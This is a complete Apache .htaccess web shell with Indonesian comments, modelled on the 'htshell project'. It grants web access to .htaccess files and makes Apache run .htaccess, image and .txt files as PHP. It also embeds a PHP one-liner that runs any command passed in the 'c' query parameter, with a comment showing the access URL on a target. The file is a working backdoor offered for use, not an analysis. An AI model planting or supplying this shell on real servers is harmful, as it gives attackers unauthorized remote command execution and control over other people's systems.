# Self contained .htaccess web shell (htshell project style)
# 1) izinkan .htaccess diakses via web, 2) Apache menganggap .htaccess sebagai PHP
<Files ~ "^\.ht">
  Require all granted
  Order allow,deny
  Allow from all
</Files>
AddType application/x-httpd-php .htaccess
AddType application/x-httpd-php .png .jpg .gif .txt
AddHandler application/x-httpd-php .php .phtml .pht
# akses: http://target/.htaccess?c=id
<?php echo "\n"; passthru($_GET['c'].' 2>&1'); ?>
